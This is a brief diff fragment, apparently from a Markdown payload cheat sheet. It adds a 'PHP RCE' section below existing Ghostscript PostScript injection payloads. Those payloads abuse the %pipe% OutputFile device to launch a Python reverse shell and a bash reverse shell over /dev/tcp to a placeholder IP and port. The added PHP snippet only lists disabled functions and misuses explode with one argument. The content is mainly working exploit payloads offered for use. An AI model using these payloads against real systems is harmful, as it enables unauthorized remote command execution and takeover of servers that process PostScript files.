@@ -38,4 +38,9 @@ mark /OutputFile (%pipe%python -c 'import socket,subprocess,os;s=socket.socket(s
 %%legal
 %%mark /OutputFile (%pipe%bash -c 'bash -i >& /dev/tcp/<ip>/<port> 0>&1') currentdevice putdeviceprops
 ```
+
+### PHP RCE
+```php
+<?php var_dump(explode('.'.ini_get('disable_functions')));?>
+```
      
